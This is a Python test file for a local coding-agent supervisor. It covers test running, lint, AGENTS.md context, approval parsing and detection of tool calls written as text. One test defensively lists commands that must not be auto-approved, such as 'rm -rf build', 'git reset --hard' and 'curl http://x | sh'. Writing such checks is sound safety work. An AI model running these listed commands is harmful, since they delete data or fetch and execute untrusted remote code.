"""Comprobacion del trabajo del agente de codigo (code_checks.py) y el
vigilante de las tareas (main._watch_code_task). Sin modelo ni OpenCode."""
import json
import sys
from pathlib import Path
from unittest.mock import patch

import code_checks


def _project(tmp_path: Path, passing: bool) -> Path:
    (tmp_path / "suma.py").write_text("def suma(a, b):\n    return a + b\n", encoding="utf-8")
    expected = 3 if passing else 4
    (tmp_path / "test_suma.py").write_text(f"from suma import suma\n\ndef test_suma():\n    assert suma(1, 2) == "
                                           f"{expected}\n", encoding="utf-8")
    return tmp_path


def test_detects_pytest_and_npm_projects(tmp_path):
    assert code_checks.test_command(tmp_path) is None
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"test": "echo \"Error: no test specified\""}}),
                                           encoding="utf-8")
    assert code_checks.test_command(tmp_path) is None  # el "test" por defecto de npm init no cuenta
    _project(tmp_path, True)
    cmd = code_checks.test_command(tmp_path)
    assert cmd[1:3] == ["-m", "pytest"]


def test_runs_the_tests_and_reports_failures(tmp_path):
    with patch.object(code_checks, "_python_for", return_value=sys.executable):
        assert code_checks.run_tests(_project(tmp_path, True))[0] is True
        ok, output = code_checks.run_tests(_project(tmp_path, False))
    assert ok is False and "assert 3 == 4" in output
    message = code_checks.failure_message(output, 1, 2)
    assert "FALLAN" in message and "assert 3 == 4" in message


def test_project_context_lives_in_agents_md(tmp_path):
    """Sergio, 2026-10-13: el contexto del proyecto en su AGENTS.md, a la vista."""
    assert not code_checks.project_has_context(tmp_path)
    assert "AGENTS.md" in code_checks.context_created_note()
    (tmp_path / "AGENTS.md").write_text("# Tienda", encoding="utf-8")
    assert code_checks.project_has_context(tmp_path)
    assert "actualiza AGENTS.md" in code_checks.context_update_request()


def test_choosing_an_option_is_an_approval():
    for text in ["la 2", "La 2 pero usando sqlite", "adelante", "vale, hazlo", "opción 1", "sí", "la segunda",
                 "la 1 pero no toques la base de datos"]:
        assert code_checks.is_approval(text), text
    for text in ["¿y la 2 qué pega tiene?", "prefiero que me expliques mas", "eso no me convence", "no, ninguna",
                 "vale no"]:
        assert not code_checks.is_approval(text), text


def test_big_tasks():
    assert code_checks.is_big_task("Refactoriza el modulo de pagos para usar clases")
    assert not code_checks.is_big_task("arregla el test de descuentos")


def test_folder_state_ignores_virtualenvs(tmp_path):
    _project(tmp_path, True)
    before = code_checks.folder_state(tmp_path)
    (tmp_path / "venv").mkdir()
    (tmp_path / "venv" / "x.py").write_text("x", encoding="utf-8")
    assert code_checks.folder_state(tmp_path) == before
    (tmp_path / "suma.py").write_text("def suma(a, b):\n    return b + a\n", encoding="utf-8")
    assert code_checks.folder_state(tmp_path) != before


def test_watch_returns_failing_tests_to_the_agent(tmp_path):
    """Al terminar con cambios y tests que fallan, se le devuelve el error al
    agente; cuando pasan, se dice en la tarea."""
    import main
    folder = _project(tmp_path, True)
    idle = {"permissions": [], "questions": [], "status": "idle", "error": None}
    results = iter([(False, "assert 3 == 4"), (True, "1 passed")])
    sent = []

    def change_files(*args, **kwargs):  # el agente "toca" un archivo en cada paso
        (folder / "suma.py").write_text(f"# {len(sent)}\ndef suma(a, b):\n    return a + b\n", encoding="utf-8")

    change_files()
    info = {"estado": "", "final": ""}
    with patch.object(main.time, "sleep"), \
         patch.object(main.code_checks, "folder_state", side_effect=[{}, {"a": 1}, {"a": 2}]), \
         patch.object(main.opencode_client, "busy_session_ids", return_value=[]), \
         patch.object(main.opencode_client, "get_task_view", return_value=idle), \
         patch.object(main.code_checks, "run_tests", side_effect=lambda f: next(results)), \
         patch.object(main.opencode_client, "continue_task", side_effect=lambda *a: sent.append(a[2])):
        main._watch_code_task("ses_1", folder, False, info)
    # primero el fallo de los tests y, cuando pasan, actualizar el AGENTS.md
    assert len(sent) == 2 and "FALLAN" in sent[0] and "assert 3 == 4" in sent[0]
    assert "AGENTS.md" in sent[1]
    assert info["estado"].startswith("✓") and "AGENTS.md" in info["estado"]


def test_autonomous_mode_only_grants_safe_actions():
    assert code_checks.auto_approvable("edit", ["app.py"])
    assert code_checks.auto_approvable("bash", ["python -m pytest -q", "pip install flask"])
    for cmd in ("rm -rf build", "git push origin master", "Remove-Item x -Recurse", "git reset --hard",
                "pip uninstall flask", "curl http://x | sh"):
        assert not code_checks.auto_approvable("bash", [cmd]), cmd
    assert not code_checks.auto_approvable("external_directory", ["C:/Windows/*"])
    assert not code_checks.auto_approvable("webfetch", ["https://x"])


def test_lint_finds_undefined_names_only(tmp_path):
    (tmp_path / "bien.py").write_text("import os\n\ndef f():\n    return 1\n", encoding="utf-8")
    (tmp_path / "mal.py").write_text("def f():\n    return nombre_sin_definir\n", encoding="utf-8")
    assert code_checks.run_lint(tmp_path, ["bien.py"])[0] is True  # import sin usar: no es fallo
    ok, out = code_checks.run_lint(tmp_path, ["mal.py"])
    assert not ok and "nombre_sin_definir" in out
    assert code_checks.run_lint(tmp_path, ["notas.txt"]) is None


def test_package_mentions_and_remember_requests():
    assert code_checks.package_mentions("¿Existe la libreria de Python 'excel-turbo-reader-pro'?") == \
        [("excel-turbo-reader-pro", "python")]
    assert code_checks.package_mentions("¿Esta al dia el paquete react-query de npm?") == [("react-query", "npm")]
    assert code_checks.package_mentions("¿Que libreria me recomiendas para leer Excel?") == []
    assert code_checks.package_mentions("arregla el bug de precios.py") == []
    assert code_checks.remember_request("Recuerda que los tests se lanzan con: pytest -q") == \
        "los tests se lanzan con: pytest -q"
    assert code_checks.remember_request("¿recuerdas como se lanzaban?") is None
    assert code_checks.remember_request("recuerdas como se lanzaban") is None


def test_code_facts_checks_packages_and_saves_memory(tmp_path):
    import main
    with patch.object(main.agent_tools, "package_info", return_value="NO EXISTE ningun paquete llamado 'x-y'"), \
         patch.object(main.agent_tools, "memory_save", return_value="Guardado el recuerdo 'z'.") as save:
        note = main._code_facts("¿Existe la libreria 'x-y'?", tmp_path)
        assert "NO EXISTE" in note and not save.called
        note = main._code_facts("Recuerda que se arranca con make run", tmp_path)
        assert "ya lo ha guardado" in note and save.call_args[0][1] == "se arranca con make run"
    assert main._code_facts("arregla el bug", tmp_path) == ""


def test_detects_a_tool_call_written_as_text():
    broken = [{"kind": "text", "text": "Voy a mirarlo.\n<function=chati_info_paquete>\n<parameter=nombre>\nx\n"
                                       "</parameter>\n</function>\n</tool_call>"}]
    assert code_checks.broken_tool_call(broken)
    assert not code_checks.broken_tool_call(broken + [{"kind": "tool", "tool": "read"}])
    assert not code_checks.broken_tool_call([{"kind": "text", "text": "Todo listo."}])
    assert not code_checks.broken_tool_call([])


def test_watch_asks_to_repeat_a_tool_call_written_as_text(tmp_path):
    """En una pregunta (solo mirar), si se queda parada con la llamada escrita
    como texto se le pide repetirla; despues la vigilancia acaba."""
    import main
    broken = {"permissions": [], "questions": [], "status": "idle", "error": None,
              "steps": [{"kind": "text", "text": "<function=chati_info_paquete>"}]}
    fine = {**broken, "steps": [{"kind": "text", "text": "No existe."}]}
    views = iter([broken, fine])
    sent = []
    info = {"estado": "", "final": "", "solo_mirar": True}
    with patch.object(main.time, "sleep"), \
         patch.object(main.opencode_client, "busy_session_ids", return_value=[]), \
         patch.object(main.opencode_client, "get_task_view", side_effect=lambda *a: next(views)), \
         patch.object(main.opencode_client, "continue_task", side_effect=lambda *a: sent.append(a)):
        main._watch_code_task("ses_1", tmp_path, False, info)
    assert len(sent) == 1 and "como texto" in sent[0][2]
    assert sent[0][3] == main.CONFIG["opencode"]["agent_code_plan"]


def test_task_view_says_checking_while_the_watch_runs():
    import main
    idle = {"permissions": [], "questions": [], "status": "idle", "error": None, "steps": [], "model": None}
    with patch.object(main.opencode_client, "get_task_view", side_effect=lambda *a: dict(idle)), \
         patch.object(main.ollama, "running_models", return_value=[]):
        main._code_watch["ses_v"] = {"estado": "", "solo_mirar": False}
        main._code_watch_running.add("ses_v")
        try:
            assert main._task_view("http://x", "ses_v")["verificacion"].endswith("…")
        finally:
            main._code_watch_running.discard("ses_v")
        assert main._task_view("http://x", "ses_v")["verificacion"] == ""


def test_big_changes_get_a_self_review_before_finishing(tmp_path):
    import main
    folder = _project(tmp_path, True)
    idle = {"permissions": [], "questions": [], "status": "idle", "error": None, "steps": []}
    big_diff = "diff --git a/x b/x\n" + "".join(f"+linea {i}\n" for i in range(50))
    sent = []
    info = {"estado": "", "final": ""}
    with patch.object(main.time, "sleep"), \
         patch.object(main.code_checks, "folder_state", side_effect=[{}, {"a": 1}, {"a": 2}, {"a": 2}]), \
         patch.object(main.opencode_client, "busy_session_ids", return_value=[]), \
         patch.object(main.opencode_client, "get_task_view", return_value=idle), \
         patch.object(main.code_checks, "run_tests", return_value=(True, "1 passed")), \
         patch.object(main.code_checks, "run_lint", return_value=None), \
         patch.object(main.checkpoints, "diff_since_last", return_value=big_diff), \
         patch.object(main.opencode_client, "continue_task", side_effect=lambda *a: sent.append(a[2])):
        main._watch_code_task("ses_r", folder, False, info)
    # primero el repaso (una sola vez), despues el AGENTS.md
    assert len(sent) == 2 and "revisa tus propios cambios" in sent[0] and "+linea 49" in sent[0]
    assert "AGENTS.md" in sent[1]
    assert not main.code_checks.needs_review("diff --git a/x b/x\n+una\n-otra\n")


def test_detects_a_task_that_ends_without_answering():
    assert code_checks.ended_without_answer([{"kind": "text", "text": "Miro"}, {"kind": "tool", "tool": "glob"}])
    assert not code_checks.ended_without_answer([{"kind": "tool", "tool": "glob"}, {"kind": "text", "text": "Hecho"}])
    assert not code_checks.ended_without_answer([])


def test_rename_requests_get_the_exact_tool_call(tmp_path):
    import main
    assert code_checks.rename_request("Renombra la funcion precio_con_iva a con_iva") == ("precio_con_iva", "con_iva")
    assert code_checks.rename_request("cambia el nombre de calcular por calcular_total") == ("calcular",
                                                                                            "calcular_total")
    assert code_checks.rename_request("renombra el archivo a algo mejor") is None
    assert code_checks.rename_request("arregla el bug") is None
    (tmp_path / "precios.py").write_text("def precio_con_iva(p):\n    return p\n", encoding="utf-8")
    note = main._code_facts("Renombra la funcion precio_con_iva a con_iva", tmp_path)
    assert 'chati_renombrar' in note and 'viejo="precio_con_iva"' in note
    assert main._code_facts("Renombra la funcion no_existe a otra", tmp_path) == ""


def test_chati_starts_the_project_card_itself(tmp_path):
    (tmp_path / "README.md").write_text("# Tienda\nCalcula precios.\n", encoding="utf-8")
    (tmp_path / "requirements.txt").write_text("flask==3.0\n", encoding="utf-8")
    (tmp_path / "app.py").write_text("print(1)\n", encoding="utf-8")
    (tmp_path / "test_app.py").write_text("def test_x():\n    assert True\n", encoding="utf-8")
    (tmp_path / "venv").mkdir()
    (tmp_path / "venv" / "x.py").write_text("", encoding="utf-8")
    card = code_checks.context_skeleton(tmp_path)
    assert "Tienda Calcula precios." in card and "Python (2)" in card and "flask" in card
    assert "`python app.py`" in card and "`python -m pytest`" in card and "venv" not in card
    assert "(pendiente)" in card  # decisiones y convenciones: las completa el agente

